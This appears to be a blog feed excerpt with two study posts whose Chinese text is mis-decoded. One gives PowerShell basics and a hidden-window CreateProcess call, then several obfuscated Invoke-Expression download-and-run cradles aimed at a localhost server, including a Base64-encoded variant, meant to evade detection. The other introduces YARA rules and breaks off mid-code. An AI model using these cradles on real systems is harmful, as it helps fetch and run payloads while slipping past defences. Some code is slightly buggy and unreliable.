<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$day</span>=<span class="number">5</span></span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$day</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">1</span>&#123;<span class="built_in">echo</span> <span class="string">&quot;ä»Šå¤©æ˜¯æ˜ŸæœŸä¸€&quot;</span>&#125;</span><br><span class="line">  <span class="number">2</span>&#123;<span class="built_in">echo</span> <span class="string">&quot;ä»Šå¤©æ˜¯æ˜ŸæœŸäºŒ&quot;</span>&#125;</span><br><span class="line">  <span class="number">3</span>&#123;<span class="built_in">echo</span> <span class="string">&quot;ä»Šå¤©æ˜¯æ˜ŸæœŸä¸‰&quot;</span>&#125;</span><br><span class="line">  <span class="number">4</span>&#123;<span class="built_in">echo</span> <span class="string">&quot;ä»Šå¤©æ˜¯æ˜ŸæœŸå››&quot;</span>&#125;</span><br><span class="line">  <span class="number">5</span>&#123;<span class="built_in">echo</span> <span class="string">&quot;ä»Šå¤©æ˜¯æ˜ŸæœŸäº”&quot;</span>&#125;</span><br><span class="line">  <span class="number">6</span>&#123;<span class="built_in">echo</span> <span class="string">&quot;ä»Šå¤©æ˜¯æ˜ŸæœŸå…­&quot;</span>&#125;</span><br><span class="line">  <span class="number">7</span>&#123;<span class="built_in">echo</span> <span class="string">&quot;ä»Šå¤©æ˜¯æ˜ŸæœŸæ—¥&quot;</span>&#125;</span><br><span class="line">  default&#123;<span class="built_in">echo</span> <span class="string">&quot;è¯·è¾“å…¥1-7&quot;</span>&#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment"># ä»Šå¤©æ˜¯æ˜ŸæœŸäº”</span></span><br></pre></td></tr></table></figure>

<br>

<h5 id="å¾ªç¯"><a href="#å¾ªç¯" class="headerlink" title="å¾ªç¯"></a>å¾ªç¯</h5><ul>
<li>for</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">1</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="number">10</span>; <span class="variable">$i</span>=<span class="variable">$i</span>+<span class="number">1</span>)&#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$i</span> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>foreach</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$i</span> <span class="keyword">in</span> <span class="variable">$a</span>)&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>while</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$i</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$i</span> <span class="operator">-le</span> <span class="number">5</span>)&#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line">  <span class="variable">$i</span> +=<span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>do while</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$i</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line">  <span class="variable">$i</span> +=<span class="number">1</span></span><br><span class="line">&#125;<span class="keyword">while</span>(<span class="variable">$i</span> <span class="operator">-le</span> <span class="number">5</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>continue</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$i</span>=<span class="number">1</span> </span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$i</span> <span class="operator">-le</span> <span class="number">5</span>)&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$i</span> <span class="operator">-eq</span> <span class="number">3</span>)&#123;</span><br><span class="line">    <span class="variable">$i</span> +=<span class="number">1</span></span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line">  <span class="variable">$i</span> +=<span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>break</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">1</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="number">5</span>; <span class="variable">$a</span>+=<span class="number">1</span>)&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$i</span> <span class="operator">-eq</span> <span class="number">3</span>)&#123;</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line">  <span class="variable">$i</span> +=<span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="0x06-å‡½æ•°"><a href="#0x06-å‡½æ•°" class="headerlink" title="0x06 å‡½æ•°"></a>0x06 å‡½æ•°</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span><span class="params">([int]<span class="variable">$x</span>)</span></span>&#123;</span><br><span class="line">  <span class="variable">$res</span> = <span class="variable">$x</span> * <span class="variable">$x</span></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$res</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$result</span> = func(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$result</span></span><br></pre></td></tr></table></figure>

<h4 id="0x07-Win32API"><a href="#0x07-Win32API" class="headerlink" title="0x07 Win32API"></a>0x07 Win32API</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»ºä¸€ä¸ªçº¿ç¨‹å¯åŠ¨calc </span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Add-Type</span> <span class="literal">-TypeDefinition</span> <span class="string">@&quot;    #å£°æ˜</span></span><br><span class="line"><span class="string">using System;</span></span><br><span class="line"><span class="string">using System.Diagnostics;</span></span><br><span class="line"><span class="string">using System.Runtime.InteropServices;</span></span><br><span class="line"><span class="string">[StructLayout(LayoutKind.Sequential)]</span></span><br><span class="line"><span class="string">public struct PROCESS_INFORMATION</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">public IntPtr hProcess;</span></span><br><span class="line"><span class="string">public IntPtr hThread;</span></span><br><span class="line"><span class="string">public uint dwProcessId;</span></span><br><span class="line"><span class="string">public uint dwThreadId;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]</span></span><br><span class="line"><span class="string">public struct STARTUPINFO</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">public uint cb;</span></span><br><span class="line"><span class="string">public string lpReserved;</span></span><br><span class="line"><span class="string">public string lpDesktop;</span></span><br><span class="line"><span class="string">public string lpTitle;</span></span><br><span class="line"><span class="string">public uint dwX;</span></span><br><span class="line"><span class="string">public uint dwY;</span></span><br><span class="line"><span class="string">public uint dwXSize;</span></span><br><span class="line"><span class="string">public uint dwYSize;</span></span><br><span class="line"><span class="string">public uint dwXCountChars;</span></span><br><span class="line"><span class="string">public uint dwYCountChars;</span></span><br><span class="line"><span class="string">public uint dwFillAttribute;</span></span><br><span class="line"><span class="string">public uint dwFlags;</span></span><br><span class="line"><span class="string">public short wShowWindow;</span></span><br><span class="line"><span class="string">public short cbReserved2;</span></span><br><span class="line"><span class="string">public IntPtr lpReserved2;</span></span><br><span class="line"><span class="string">public IntPtr hStdInput;</span></span><br><span class="line"><span class="string">public IntPtr hStdOutput;</span></span><br><span class="line"><span class="string">public IntPtr hStdError;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">[StructLayout(LayoutKind.Sequential)]</span></span><br><span class="line"><span class="string">public struct SECURITY_ATTRIBUTES</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">public int length;</span></span><br><span class="line"><span class="string">public IntPtr lpSecurityDescriptor;</span></span><br><span class="line"><span class="string">public bool bInheritHandle;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">public static class Kernel32</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">[DllImport(&quot;kernel32.dll&quot;, SetLastError=true)]</span></span><br><span class="line"><span class="string">public static extern bool CreateProcess(</span></span><br><span class="line"><span class="string">string lpApplicationName,</span></span><br><span class="line"><span class="string">string lpCommandLine,</span></span><br><span class="line"><span class="string">ref SECURITY_ATTRIBUTES lpProcessAttributes,</span></span><br><span class="line"><span class="string">ref SECURITY_ATTRIBUTES lpThreadAttributes,</span></span><br><span class="line"><span class="string">bool bInheritHandles,</span></span><br><span class="line"><span class="string">uint dwCreationFlags,</span></span><br><span class="line"><span class="string">IntPtr lpEnvironment,</span></span><br><span class="line"><span class="string">string lpCurrentDirectory,</span></span><br><span class="line"><span class="string">ref STARTUPINFO lpStartupInfo,</span></span><br><span class="line"><span class="string">out PROCESS_INFORMATION lpProcessInformation);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;@</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># StartupInfo Struct</span></span><br><span class="line"><span class="variable">$StartupInfo</span> = <span class="built_in">New-Object</span> STARTUPINFO</span><br><span class="line"><span class="variable">$StartupInfo</span>.dwFlags = <span class="number">0</span>x00000001 <span class="comment"># STARTF_USESHOWWINDOW</span></span><br><span class="line"><span class="variable">$StartupInfo</span>.wShowWindow = <span class="number">0</span>x0000 <span class="comment"># SW_HIDE</span></span><br><span class="line"><span class="variable">$StartupInfo</span>.cb = [<span class="type">System.Runtime.InteropServices.Marshal</span>]::SizeOf(<span class="variable">$StartupInfo</span>)</span><br><span class="line"><span class="comment"># Struct Size</span></span><br><span class="line"><span class="comment"># ProcessInfo Struct</span></span><br><span class="line"><span class="variable">$ProcessInfo</span> = <span class="built_in">New-Object</span> PROCESS_INFORMATION</span><br><span class="line"><span class="comment"># SECURITY_ATTRIBUTES Struct (Process &amp;amp; Thread)</span></span><br><span class="line"><span class="variable">$SecAttr</span> = <span class="built_in">New-Object</span> SECURITY_ATTRIBUTES</span><br><span class="line"><span class="variable">$SecAttr</span>.Length = [<span class="type">System.Runtime.InteropServices.Marshal</span>]::SizeOf(<span class="variable">$SecAttr</span>)</span><br><span class="line"><span class="comment"># CreateProcess In CurrentDirectory</span></span><br><span class="line"><span class="variable">$GetCurrentPath</span> = (<span class="built_in">Get-Item</span> <span class="literal">-Path</span> <span class="string">&quot;.\&quot;</span> <span class="literal">-Verbose</span>).FullName</span><br><span class="line"><span class="comment"># Call CreateProcess</span></span><br><span class="line">[<span class="type">Kernel32</span>]::CreateProcess(<span class="string">&quot;C:\Windows\System32\cmd.exe&quot;</span>, <span class="string">&quot;/c calc.exe&quot;</span>, [<span class="type">ref</span>] <span class="variable">$SecAttr</span>, [<span class="type">ref</span>] <span class="variable">$SecAttr</span>, <span class="variable">$false</span>,</span><br><span class="line"><span class="number">0</span>x08000000, [<span class="built_in">Int</span><span class="type">Ptr</span>]::Zero, <span class="variable">$GetCurrentPath</span>, [<span class="type">ref</span>] <span class="variable">$StartupInfo</span>, [<span class="type">ref</span>] <span class="variable">$ProcessInfo</span>) |<span class="built_in">out-null</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ„Ÿè§‰ç”¨èµ·æ¥æ¯”è¾ƒéº»çƒ¦ï¼Œéœ€è¦å…ˆå»å£°æ˜ç»“æ„ä½“å•¥çš„ å†å»è°ƒç”¨</span></span><br></pre></td></tr></table></figure>

<br>

<h4 id="0x08-æ–‡ä»¶ä¸‹è½½"><a href="#0x08-æ–‡ä»¶ä¸‹è½½" class="headerlink" title="0x08 æ–‡ä»¶ä¸‹è½½"></a>0x08 æ–‡ä»¶ä¸‹è½½</h4><p><code>invoke-webrequest -Uri $url -OutFile $output</code></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$url</span> = <span class="string">&quot;http://www.baidu.com&quot;</span></span><br><span class="line"><span class="variable">$output</span> = <span class="string">&quot;F:\1.html&quot;</span></span><br><span class="line"><span class="built_in">invoke-webrequest</span> <span class="literal">-Uri</span> <span class="variable">$url</span> <span class="literal">-OutFile</span> <span class="variable">$output</span></span><br></pre></td></tr></table></figure>

<p><code>(New-Object System.Net.WebClient).DownloadFile($url,$output)</code> </p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$url</span> = <span class="string">&quot;http://www.baidu.com&quot;</span></span><br><span class="line"><span class="variable">$output</span> = <span class="string">&quot;F:\2.html&quot;</span></span><br><span class="line">(<span class="built_in">New-Object</span> System.Net.WebClient).DownloadFile(<span class="variable">$url</span>,<span class="variable">$output</span>) </span><br></pre></td></tr></table></figure>

<br>

<h4 id="0x09-æ–‡ä»¶æ“ä½œ"><a href="#0x09-æ–‡ä»¶æ“ä½œ" class="headerlink" title="0x09 æ–‡ä»¶æ“ä½œ"></a>0x09 æ–‡ä»¶æ“ä½œ</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ–°å»ºç›®å½•test</span></span><br><span class="line"><span class="built_in">New-Item</span> test <span class="literal">-ItemType</span> directory </span><br><span class="line"><span class="comment"># åˆ é™¤ç›®å½•test</span></span><br><span class="line"><span class="built_in">Remove-Item</span> test </span><br><span class="line"><span class="comment"># æ–°å»ºæ–‡ä»¶test.txt</span></span><br><span class="line"><span class="built_in">New-Item</span> test.txt <span class="literal">-ItemType</span> file </span><br><span class="line"><span class="comment"># æ–°å»ºæ–‡ä»¶test.txtï¼Œå†…å®¹ä¸º test</span></span><br><span class="line"><span class="built_in">New-Item</span> test.txt <span class="literal">-ItemType</span> file <span class="literal">-value</span> <span class="string">&quot;test&quot;</span> </span><br><span class="line"><span class="comment"># åˆ é™¤æ–‡ä»¶test.txt</span></span><br><span class="line"><span class="built_in">Remove-Item</span> test.txt </span><br><span class="line"><span class="comment"># æŸ¥çœ‹æ–‡ä»¶test.txtå†…å®¹</span></span><br><span class="line"><span class="built_in">Get-Content</span> test.txt </span><br><span class="line"><span class="comment"># è®¾ç½®æ–‡ä»¶test.txtå†…å®¹t</span></span><br><span class="line"><span class="built_in">Set-Content</span> test.txt <span class="literal">-Value</span> <span class="string">&quot;test&quot;</span> </span><br><span class="line"><span class="comment"># ç»™æ–‡ä»¶test.txtè¿½åŠ å†…å®¹</span></span><br><span class="line"><span class="built_in">Add-Content</span> test.txt <span class="literal">-Value</span> <span class="string">&quot;,test2&quot;</span> </span><br><span class="line"><span class="comment"># æ¸…é™¤æ–‡ä»¶test.txtå†…å®¹</span></span><br><span class="line"><span class="built_in">Clear-Content</span> test.txt</span><br></pre></td></tr></table></figure>

<br>

<h4 id="0x0a-ç®€å•æ··æ·†"><a href="#0x0a-ç®€å•æ··æ·†" class="headerlink" title="0x0a ç®€å•æ··æ·†"></a>0x0a ç®€å•æ··æ·†</h4><p><code>Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;http://127.0.0.1:8000/1.txt&quot;)</code></p>
<br>

<ul>
<li>1.å»æ‰Systemå…³é”®è¯</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&quot;http://127.0.0.1:8000/1.txt&quot;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>2.ä½¿ç”¨å­—ç¬¦ä¸²è¿æ¥+å·è¿æ¥</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;h&#x27;</span>+<span class="string">&#x27;ttp://127.0.0.1:8000/1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>3.ä½¿ç”¨Invokeæ–¹æ³•</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).(<span class="string">&quot;DownloadString&quot;</span>).Invoke(<span class="string">&#x27;h&#x27;</span>+<span class="string">&#x27;ttp://127.0.0.1:8000/1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>4.å˜é‡æ›¿ä»£</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ds</span>=<span class="string">&quot;Down&quot;</span>+<span class="string">&quot;loadString&quot;</span>;</span><br><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).<span class="variable">$ds</span>.Invoke(<span class="string">&#x27;h&#x27;</span>+<span class="string">&#x27;ttp://127.0.0.1:8000/1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>5.å…³é”®è¯ä½¿ç”¨å•åŒå¼•å·å¼•èµ·æ¥</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).<span class="string">&quot;DownloadString&quot;</span>(<span class="string">&#x27;h&#x27;</span>+<span class="string">&#x27;ttp://127.0.0.1/powershell&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>6.è½¬ä¹‰ç¬¦å·</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).<span class="string">&quot;D o wn l oad Str in g&quot;</span>(<span class="string">&#x27;h&#x27;</span>+<span class="string">&#x27;ttp://127.0.0.1:8000/1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>7.å­—ç¬¦ä¸²åè½¬</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$re</span>= <span class="string">&quot;)&#x27;txt.1/0008:1.0.0.721//:ptth&#x27;(gnirtSdaolnwoD.)tneilCbeW.teN tcejbO-weN(&quot;</span>;</span><br><span class="line">(<span class="variable">$re</span>[-<span class="number">1</span><span class="type">..</span>-(<span class="variable">$re</span><span class="type">.Length</span>)] <span class="operator">-Join</span> <span class="string">&#x27;&#x27;</span>) | <span class="built_in">IEX</span></span><br></pre></td></tr></table></figure>

<ul>
<li>8.ç¼–ç æ‰§è¡Œ</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$command</span> = <span class="string">&quot;Invoke-Expression (New-Object Net.WebClient).DownloadString(&#x27;h&#x27;+&#x27;ttp://127.0.0.1:8000/1.txt&#x27;)&quot;</span></span><br><span class="line"><span class="variable">$bytes</span> = [<span class="type">System.Text.Encoding</span>]::Unicode.GetBytes(<span class="variable">$command</span>)</span><br><span class="line"><span class="variable">$encodedCommand</span> = [<span class="type">Convert</span>]::ToBase64String(<span class="variable">$bytes</span>)</span><br><span class="line">powershell.exe <span class="literal">-EncodedCommand</span> <span class="variable">$encodedCommand</span></span><br></pre></td></tr></table></figure>

<h5 id="æ··æ·†å·¥å…·"><a href="#æ··æ·†å·¥å…·" class="headerlink" title="æ··æ·†å·¥å…·"></a>æ··æ·†å·¥å…·</h5><p> Invoke-Obfuscation</p>
<p><a href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a></p>
<p>Revoke-Obfuscation</p>
<br>

<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;gsh3ll.top&#x2F;2021&#x2F;12&#x2F;18&#x2F;%E3%80%90%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0%E3%80%91PowerShell%E5%9F%BA%E7%A1%80&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;cloud.tencent.com&#x2F;developer&#x2F;article&#x2F;1639161</span><br><span class="line">https:&#x2F;&#x2F;www.secrss.com&#x2F;articles&#x2F;20119</span><br><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;linuxsec&#x2F;articles&#x2F;7384582.html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>Yaraè§„åˆ™å­¦ä¹ -01</title>
    <url>/posts/db5cae05/</url>
    <content><![CDATA[<h3 id="å®˜æ–¹demo"><a href="#å®˜æ–¹demo" class="headerlink" title="å®˜æ–¹demo"></a>å®˜æ–¹demo</h3><p><a href="https://github.com/VirusTotal/yara">https://github.com/VirusTotal/yara</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rule silent_banker : banker</span><br><span class="line">&#123;</span><br><span class="line">    meta:</span><br><span class="line">        description &#x3D; &quot;This is just an example&quot;</span><br><span class="line">        threat_level &#x3D; 3</span><br><span class="line">        in_the_wild &#x3D; true</span><br><span class="line"></span><br><span class="line">    strings:</span><br><span class="line">        $a &#x3D; &#123;6A 40 68 00 30 00 00 6A 14 8D 91&#125;</span><br><span class="line">        $b &#x3D; &#123;8D 4D B0 2B C1 83 C0 27 99 6A 4E 59 F7 F9&#125;</span><br><span class="line">        $c &#x3D; &quot;UVODFRYSIHLNWPEJXQZAKCBGMT&quot;   &#x2F;&#x2F;æ ·æœ¬ä¸­å‡ºç°çš„æœºå™¨ç æˆ–è€…å­—ç¬¦ä¸²</span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        $a or $b or $c          &#x2F;&#x2F; æ»¡è¶³å…¶ä¸­ä¸€ä¸ªæ¡ä»¶å³å¯è¿›è¡ŒåŒ¹é…</span><br><span class="line">&#125;c</span><br></pre></td></tr></table></figure>

<br>

<h3 id="Yaraè§„åˆ™è¯­æ³•"><a href="#Yaraè§„åˆ™è¯­æ³•" class="headerlink" title="Yaraè§„åˆ™è¯­æ³•"></a>Yaraè§„åˆ™è¯­æ³•</h3><p>ä¸€èˆ¬åŒ…å«3éƒ¨åˆ†ï¼Œåˆ†åˆ«ä¸º meta  string condition</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rule RuleName</span><br><span class="line">&#123;</span><br><span class="line">    meta:           &#x2F;&#x2F;è¯¥è§„åˆ™çš„åŸºç¡€ä¿¡æ¯</span><br><span class="line">    strings:        &#x2F;&#x2F;ç”¨æ¥å®šä¹‰å­—ç¬¦ä¸²</span><br><span class="line">    condition:      &#x2F;&#x2F;ç¼–å†™è¡¨è¾¾å¼å¤„ç†stringsä¸­çš„å­—ç¬¦ä¸²</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ruleå‘½åè§„åˆ™"><a href="#ruleå‘½åè§„åˆ™" class="headerlink" title="ruleå‘½åè§„åˆ™"></a>ruleå‘½åè§„åˆ™</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.è‹±æ–‡æˆ–å­—æ¯ç»„æˆçš„å­—ç¬¦ä¸²</span><br><span class="line">2.å¯ä»¥ä½¿ç”¨ä¸‹åˆ’çº¿</span><br><span class="line">3.ç¬¬ä¸€ä¸ªå­—ç¬¦ç¦æ­¢ä¸ºæ•°å­—</span><br><span class="line">4.å¤§å°å†™æ•æ„Ÿ</span><br><span class="line">5.ä¸å¯ä»¥å¤§äº128ä¸ªå­—ç¬¦é•¿åº¦</span><br></pre></td></tr></table></figure>

<h4 id="Yaraè§„åˆ™æ”¯æŒå­—ç¬¦ä¸²ã€æ­£åˆ™è¡¨è¾¾å¼ã€åå…­è¿›åˆ¶è¿›è¡ŒåŒ¹é…ã€‚"><a href="#Yaraè§„åˆ™æ”¯æŒå­—ç¬¦ä¸²ã€æ­£åˆ™è¡¨è¾¾å¼ã€åå…­è¿›åˆ¶è¿›è¡ŒåŒ¹é…ã€‚" class="headerlink" title="Yaraè§„åˆ™æ”¯æŒå­—ç¬¦ä¸²ã€æ­£åˆ™è¡¨è¾¾å¼ã€åå…­è¿›åˆ¶è¿›è¡ŒåŒ¹é…ã€‚"></a>Yaraè§„åˆ™æ”¯æŒå­—ç¬¦ä¸²ã€æ­£åˆ™è¡¨è¾¾å¼ã€åå…­è¿›åˆ¶è¿›è¡ŒåŒ¹é…ã€‚</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">å­—ç¬¦ä¸²ï¼šå®šä¹‰ä¸€ä¸ªå˜é‡ $a &#x3D; â€œå­—ç¬¦ä¸²å†…å®¹â€</span><br><span class="line"></span><br><span class="line">æ­£åˆ™è¡¨è¾¾å¼ï¼šå®šä¹‰ä¸€ä¸ªå˜é‡ $a &#x3D; &#x2F;æ­£åˆ™è¡¨è¾¾å¼å†…å®¹&#x2F;</span><br><span class="line"></span><br><span class="line">åå…­è¿›åˆ¶ï¼šå®šä¹‰ä¸€ä¸ªå˜é‡ $a &#x3D; &#123;åå…­è¿›åˆ¶å†…å®¹&#125;     </span><br><span class="line">#å¯ä»¥ä½¿ç”¨ ï¼Ÿ ä½œä¸ºé€šé…ç¬¦</span><br><span class="line">$hex1 &#x3D; &#123; EF E4 ?8 D8 ?? FB&#125;</span><br><span class="line">#ä¸å®šé•¿å­—ç¬¦ä¸²å¯ä»¥ç”¨ [3-5]è¡¨ç¤º æ— é™é•¿å¯ä»¥ç”¨[-]è¡¨ç¤º</span><br><span class="line">$hex2 &#x3D; &#123; EF E4 [-] A2 FB&#125;</span><br><span class="line">$hex3 &#x3D; &#123; EF E4 [2-4] D8 A2 FB&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Yaraè§„åˆ™å¸¸ç”¨ä¿®é¥°ç¬¦"><a href="#Yaraè§„åˆ™å¸¸ç”¨ä¿®é¥°ç¬¦" class="headerlink" title="Yaraè§„åˆ™å¸¸ç”¨ä¿®é¥°ç¬¦"></a>Yaraè§„åˆ™å¸¸ç”¨ä¿®é¥°ç¬¦</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nocaseï¼šä¸åŒºåˆ†å¤§å°å†™</span><br><span class="line">base64ï¼šbase64å­—ç¬¦ä¸²</span><br><span class="line">xorï¼šå¼‚æˆ–å­—ç¬¦ä¸²</span><br><span class="line">wideï¼šå®½å­—ç¬¦</span><br></pre></td></tr></table></figure>

<h4 id="Yaraè§„åˆ™æ¡ä»¶"><a href="#Yaraè§„åˆ™æ¡ä»¶" class="headerlink" title="Yaraè§„åˆ™æ¡ä»¶"></a>Yaraè§„åˆ™æ¡ä»¶</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># å¸ƒå°”è¿ç®—</span><br><span class="line">andï¼šä¸   orï¼šæˆ–   notï¼šé</span><br><span class="line">all of themï¼š         &#x2F;&#x2F;åŒ¹é…æ‰€æœ‰æ¡ä»¶å³å‘Šè­¦</span><br><span class="line">any of themï¼š         &#x2F;&#x2F;åŒ¹é…åˆ°å…¶ä¸­ä¸€ä¸ªæ¡ä»¶å³å‘Šè­¦</span><br><span class="line">$a and $b and $cï¼š    &#x2F;&#x2F;åŒæ—¶åŒ¹é…åˆ°abcå³å‘Šè­¦</span><br><span class="line">($a and $b) or $cï¼š   &#x2F;&#x2F;åŒ¹é…åˆ°aå’Œbæˆ–cå³å‘Šè­¦</span><br><span class="line">$a and $b and $cï¼š    &#x2F;&#x2F;åŒæ—¶åŒ¹é…åˆ°abcå³å‘Šè­¦</span><br><span class="line">($a and $b) or $cï¼š   &#x2F;&#x2F;åŒ¹é…åˆ°aå’Œbæˆ–cå³å‘Šè­¦</span><br><span class="line"></span><br><span class="line"># æ–‡ä»¶å¤§å°</span><br><span class="line">filesize &gt; 200KB</span><br><span class="line"></span><br><span class="line"># è®¿é—®æŒ‡å®šä½ç½®æ•°æ®</span><br><span class="line">unint16(0) and unit32(unit32(0x3c)) &#x3D;&#x3D; 0x00004550</span><br></pre></td></tr></table></figure>

<h4 id="Yaraç¼–å†™"><a href="#Yaraç¼–å†™" class="headerlink" title="Yaraç¼–å†™"></a>Yaraç¼–å†™</h4><p>å…ˆç•¥è¿‡ åç»­æœ‰æ—¶é—´å†æä¸€ä¸‹</p>
<br>

<h3 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h3><p><code>pip install yara-python</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> yara</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–ç›®å½•å†…çš„yaraè§„åˆ™æ–‡ä»¶</span></span><br><span class="line"><span class="comment"># å°†yaraè§„åˆ™ç¼–è¯‘</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getRules</span>(<span class="params">path</span>):</span></span><br><span class="line">  filepath = &#123;&#125;</span><br><span class="line">  <span class="keyword">for</span> index, file <span class="keyword">in</span> <span class="built_in">enumerate</span>(os.listdir(path)):</span><br><span class="line">    rupath = os.path.join(path, file)</span><br><span class="line">    key = <span class="string">&quot;rule&quot;</span> + <span class="built_in">str</span>(index)</span><br><span class="line">    filepath[key] = rupath</span><br><span class="line">    print(rupath)</span><br><span class="line">    